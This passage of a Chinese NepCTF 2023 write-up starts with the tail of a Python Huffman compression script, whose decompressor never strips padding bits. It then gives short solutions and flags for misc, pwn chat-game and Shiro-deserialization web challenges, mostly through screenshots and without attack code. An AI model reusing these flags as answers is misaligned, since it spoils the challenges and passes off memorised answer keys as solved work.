punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">return</span> self<span class=\"token punctuation\">.</span>freq <span class=\"token operator\">&lt;</span> other<span class=\"token punctuation\">.</span>freq</pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">build_huffman_tree</span><span class=\"token punctuation\">(</span>frequencies<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    heap <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>HuffmanNode<span class=\"token punctuation\">(</span>char<span class=\"token punctuation\">,</span> freq<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> char<span class=\"token punctuation\">,</span> freq <span class=\"token keyword\">in</span> frequencies<span class=\"token punctuation\">.</span>items<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    heapq<span class=\"token punctuation\">.</span>heapify<span class=\"token punctuation\">(</span>heap<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>heap<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        left <span class=\"token operator\">=</span> heapq<span class=\"token punctuation\">.</span>heappop<span class=\"token punctuation\">(</span>heap<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        right <span class=\"token operator\">=</span> heapq<span class=\"token punctuation\">.</span>heappop<span class=\"token punctuation\">(</span>heap<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        merged <span class=\"token operator\">=</span> HuffmanNode<span class=\"token punctuation\">(</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span> left<span class=\"token punctuation\">.</span>freq <span class=\"token operator\">+</span> right<span class=\"token punctuation\">.</span>freq<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        merged<span class=\"token punctuation\">.</span>left <span class=\"token operator\">=</span> left</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        merged<span class=\"token punctuation\">.</span>right <span class=\"token operator\">=</span> right</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        heapq<span class=\"token punctuation\">.</span>heappush<span class=\"token punctuation\">(</span>heap<span class=\"token punctuation\">,</span> merged<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">return</span> heap<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">build_huffman_codes</span><span class=\"token punctuation\">(</span>node<span class=\"token punctuation\">,</span> current_code<span class=\"token punctuation\">,</span> huffman_codes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">if</span> node <span class=\"token keyword\">is</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">if</span> node<span class=\"token punctuation\">.</span>char <span class=\"token keyword\">is</span> <span class=\"token keyword\">not</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        huffman_codes<span class=\"token punctuation\">[</span>node<span class=\"token punctuation\">.</span>char<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> current_code</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    build_huffman_codes<span class=\"token punctuation\">(</span>node<span class=\"token punctuation\">.</span>left<span class=\"token punctuation\">,</span> current_code <span class=\"token operator\">+</span> <span class=\"token string\">'0'</span><span class=\"token punctuation\">,</span> huffman_codes<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    build_huffman_codes<span class=\"token punctuation\">(</span>node<span class=\"token punctuation\">.</span>right<span class=\"token punctuation\">,</span> current_code <span class=\"token operator\">+</span> <span class=\"token string\">'1'</span><span class=\"token punctuation\">,</span> huffman_codes<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">compress</span><span class=\"token punctuation\">(</span>input_file<span class=\"token punctuation\">,</span> output_file<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>input_file<span class=\"token punctuation\">,</span> <span class=\"token string\">'rb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        data <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    frequencies <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token keyword\">for</span> byte <span class=\"token keyword\">in</span> data<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        <span class=\"token keyword\">if</span> byte <span class=\"token keyword\">not</span> <span class=\"token keyword\">in</span> frequencies<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>            frequencies<span class=\"token punctuation\">[</span>byte<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        frequencies<span class=\"token punctuation\">[</span>byte<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    root <span class=\"token operator\">=</span> build_huffman_tree<span class=\"token punctuation\">(</span>frequencies<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    huffman_codes <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    build_huffman_codes<span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">,</span> <span class=\"token string\">''</span><span class=\"token punctuation\">,</span> huffman_codes<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    compressed_data <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    <span class=\"token keyword\">for</span> byte <span class=\"token keyword\">in</span> data<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>        compressed_data <span class=\"token operator\">+=</span> huffman_codes<span class=\"token punctuation\">[</span>byte<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    padding <span class=\"token operator\">=</span> <span class=\"token number\">8</span> <span class=\"token operator\">-</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>compressed_data<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    compressed_data <span class=\"token operator\">+=</span> <span class=\"token string\">'0'</span> <span class=\"token operator\">*</span> padding</pre></td></tr><tr><td data-num=\"59\"></td><td><pre></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>output_file<span class=\"token punctuation\">,</span> <span class=\"token string\">'wb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>        <span class=\"token comment\"># Write frequency information</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>        f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>frequencies<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>        <span class=\"token keyword\">for</span> byte<span class=\"token punctuation\">,</span> freq <span class=\"token keyword\">in</span> frequencies<span class=\"token punctuation\">.</span>items<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>            f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>byte<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>freq <span class=\"token operator\">>></span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>freq <span class=\"token operator\">>></span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>freq <span class=\"token operator\">>></span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">,</span> freq <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>        <span class=\"token comment\"># Write compressed data</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>        <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>compressed_data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>            byte <span class=\"token operator\">=</span> compressed_data<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">:</span>i<span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>            f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>byte<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre></pre></td></tr><tr><td data-num=\"72\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">build_huffman_tree_from_bytes</span><span class=\"token punctuation\">(</span>frequencies<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>    heap <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>HuffmanNode<span class=\"token punctuation\">(</span>byte<span class=\"token punctuation\">,</span> freq<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> byte<span class=\"token punctuation\">,</span> freq <span class=\"token keyword\">in</span> frequencies<span class=\"token punctuation\">.</span>items<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>    heapq<span class=\"token punctuation\">.</span>heapify<span class=\"token punctuation\">(</span>heap<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>heap<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>        left <span class=\"token operator\">=</span> heapq<span class=\"token punctuation\">.</span>heappop<span class=\"token punctuation\">(</span>heap<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>        right <span class=\"token operator\">=</span> heapq<span class=\"token punctuation\">.</span>heappop<span class=\"token punctuation\">(</span>heap<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>        merged <span class=\"token operator\">=</span> HuffmanNode<span class=\"token punctuation\">(</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span> left<span class=\"token punctuation\">.</span>freq <span class=\"token operator\">+</span> right<span class=\"token punctuation\">.</span>freq<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>        merged<span class=\"token punctuation\">.</span>left <span class=\"token operator\">=</span> left</pre></td></tr><tr><td data-num=\"81\"></td><td><pre>        merged<span class=\"token punctuation\">.</span>right <span class=\"token operator\">=</span> right</pre></td></tr><tr><td data-num=\"82\"></td><td><pre>        heapq<span class=\"token punctuation\">.</span>heappush<span class=\"token punctuation\">(</span>heap<span class=\"token punctuation\">,</span> merged<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>    <span class=\"token keyword\">return</span> heap<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre></pre></td></tr><tr><td data-num=\"86\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">decompress</span><span class=\"token punctuation\">(</span>input_file<span class=\"token punctuation\">,</span> output_file<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>input_file<span class=\"token punctuation\">,</span> <span class=\"token string\">'rb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>        frequencies_count <span class=\"token operator\">=</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>        frequencies <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>        <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>frequencies_count<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>            byte <span class=\"token operator\">=</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>            freq <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>            frequencies<span class=\"token punctuation\">[</span>byte<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> freq</pre></td></tr><tr><td data-num=\"95\"></td><td><pre></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>        root <span class=\"token operator\">=</span> build_huffman_tree_from_bytes<span class=\"token punctuation\">(</span>frequencies<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>        huffman_codes <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>        build_huffman_codes<span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">,</span> <span class=\"token string\">''</span><span class=\"token punctuation\">,</span> huffman_codes<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>        reverse_huffman_codes <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>v<span class=\"token punctuation\">:</span> k <span class=\"token keyword\">for</span> k<span class=\"token punctuation\">,</span> v <span class=\"token keyword\">in</span> huffman_codes<span class=\"token punctuation\">.</span>items<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>        decompressed_data <span class=\"token operator\">=</span> <span class=\"token builtin\">bytearray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>        code <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>        <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>            byte <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>byte<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>                <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>            byte <span class=\"token operator\">=</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>byte<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>            <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>                <span class=\"token keyword\">if</span> byte <span class=\"token operator\">&amp;</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token operator\">&lt;&lt;</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>                    code <span class=\"token operator\">+=</span> <span class=\"token string\">'1'</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>                <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>                    code <span class=\"token operator\">+=</span> <span class=\"token string\">'0'</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>                <span class=\"token keyword\">if</span> code <span class=\"token keyword\">in</span> reverse_huffman_codes<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>                    decompressed_data<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>reverse_huffman_codes<span class=\"token punctuation\">[</span>code<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre>                    code <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>output_file<span class=\"token punctuation\">,</span> <span class=\"token string\">'wb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>        f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span>decompressed_data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre></pre></td></tr><tr><td data-num=\"123\"></td><td><pre></pre></td></tr><tr><td data-num=\"124\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"125\"></td><td><pre>    <span class=\"token comment\"># input_file = 'input.txt'</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre>    compressed_file <span class=\"token operator\">=</span> <span class=\"token string\">'compressed.bin'</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre>    decompressed_file <span class=\"token operator\">=</span> <span class=\"token string\">'decompressed.txt'</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre></pre></td></tr><tr><td data-num=\"129\"></td><td><pre>    <span class=\"token comment\"># 压缩文件</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre>    <span class=\"token comment\"># compress(input_file, compressed_file)</span></pre></td></tr><tr><td data-num=\"131\"></td><td><pre></pre></td></tr><tr><td data-num=\"132\"></td><td><pre>    <span class=\"token comment\"># 解压缩文件</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre>    decompress<span class=\"token punctuation\">(</span>compressed_file<span class=\"token punctuation\">,</span> decompressed_file<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"/img/wp/2.png\" alt=\"\"></p>\n<h4 id=\"3connectedfive\"><a class=\"markdownIt-Anchor\" href=\"#3connectedfive\">#</a> 3.ConnectedFive</h4>\n<p>五子连珠，到 42 即可拿 flag</p>\n<p><img data-src=\"/img/wp/3.png\" alt=\"\"></p>\n<h4 id=\"4checkin\"><a class=\"markdownIt-Anchor\" href=\"#4checkin\">#</a> 4.CheckIn</h4>\n<blockquote>\n<p>NepCTF H4ve_Fun_1N_This_Game}</p>\n</blockquote>\n<h4 id=\"5陌生的语言\"><a class=\"markdownIt-Anchor\" href=\"#5陌生的语言\">#</a> 5. 陌生的语言</h4>\n<p><img data-src=\"/img/wp/1.jpg\" alt=\"1\"></p>\n<p><img data-src=\"/img/wp/1691849788716.jpg\" alt=\"1691849788716\"></p>\n<p>对照码表：NEPNEP_A_BELIEVING_HEART_IS_YOUR_MAGIC</p>\n<p>NepCTF NEPNEP_A_BELIEVING_HEART_IS_YOUR_MAGIC}</p>\n<h4 id=\"6小叮弹钢琴\"><a class=\"markdownIt-Anchor\" href=\"#6小叮弹钢琴\">#</a> 6. 小叮弹钢琴</h4>\n<p>音频有信息</p>\n<blockquote>\n<p>0x370a05303c290e045005031c2b1858473a5f052117032c39230f005d1e17</p>\n</blockquote>\n<blockquote>\n<p>-.–/—/…-/…/…/—/…-/.-…/-…/…-/…/./-/…/…/…/-/—/-…-/—/.-./…/—/–/./-/…/…/-./–.</p>\n</blockquote>\n<p>摩斯转化</p>\n<blockquote>\n<p>YOU SHOULD USE THIS TO XOR SOME THING</p>\n</blockquote>\n<p>异或字符串（16 进制转化）</p>\n<blockquote>\n<p>0x6e 0x45 0x50 0x63 0x74 0x66 0x5b 0x48 0x14 0x50 0x50 0x59 0x7f 0x50 0x11 0x14 0x6e 0x10 0x5d<br>\n0x6e 0x45 0x50 0x63 0x74 0x66 0x5b 0x48 0x14 0x50 0x50</p>\n</blockquote>\n<p>修改一下：找下规律去修改一下</p>\n<blockquote>\n<p>0x4e 0x65 0x70 0x43 0x54 0x46 0x7b 0x68 0x34 0x70 0x70 0x79 0x5f 0x70 0x31 0x34 0x4e 0x30 0x7d</p>\n</blockquote>\n<blockquote>\n<p>NepCTF h4ppy_p14N0}</p>\n</blockquote>\n<h4 id=\"7问卷\"><a class=\"markdownIt-Anchor\" href=\"#7问卷\">#</a> 7. 问卷</h4>\n<p><img data-src=\"/img/wp/image-20230813202714138.png\" alt=\"image-20230813202714138\"></p>\n<h2 id=\"2-pwn\"><a class=\"markdownIt-Anchor\" href=\"#2-pwn\">#</a> 2. pwn:</h2>\n<h4 id=\"hrp-chat-4\"><a class=\"markdownIt-Anchor\" href=\"#hrp-chat-4\">#</a> HRP-CHAT-4</h4>\n<p><img data-src=\"/img/wp/image-20230813203342637.png\" alt=\"image-20230813203342637\"></p>\n<p><img data-src=\"/img/wp/image-20230813203738235.png\" alt=\"image-20230813204233847\"></p>\n<p>一直买直到破坏子线程，然后执行   Safe_Mode_Key</p>\n<p>得到 flag：This is your key!</p>\n<blockquote>\n<p>Nepctf  IAMFOUR_b924541f-bd73-16f1-418d-932d681eb691</p>\n</blockquote>\n<h4 id=\"hrp-chat-3\"><a class=\"markdownIt-Anchor\" href=\"#hrp-chat-3\">#</a> HRP-CHAT-3</h4>\n<p><img data-src=\"/img/wp/image-20230813204233847.png\" alt=\"image-20230813204233847\"></p>\n<p>把 Boss 能得到 flag，只能去抽奖，但抽不到最高的，但是 H3h3QAQ 够用了</p>\n<p><img data-src=\"/img/wp/image-20230813204151370.png\" alt=\"image-20230813204151370\"></p>\n<p><img data-src=\"/img/wp/image-20230813204502026.png\" alt=\"image-20230813204502026\"></p>\n<p>序号是 9</p>\n<p><img data-src=\"/img/wp/image-20230813204547270.png\" alt=\"image-20230813204547270\"></p>\n<p>得到 flag</p>\n<h2 id=\"3-web\"><a class=\"markdownIt-Anchor\" href=\"#3-web\">#</a> 3. web:</h2>\n<h4 id=\"ez_java_checkin\"><a class=\"markdownIt-Anchor\" href=\"#ez_java_checkin\">#</a> ez_java_checkin</h4>\n<p>shiro 反序列化</p>\n<p><img data-src=\"/img/wp/image-20230813205114576.png\" alt=\"image-20230813205114576\"></p>\n<p><img data-src=\"/img/wp/image-20230813205917940.png\" alt=\"image-20230813205917940\"></p>\n<p><img data-src=\"/img/wp/image-20230813210003062.png\" alt=\"image-20230813210003062\"></p>\n<p>得到 flag。</p>\n",
            "tags": [
                "wp"
            ]
        }
    ]
}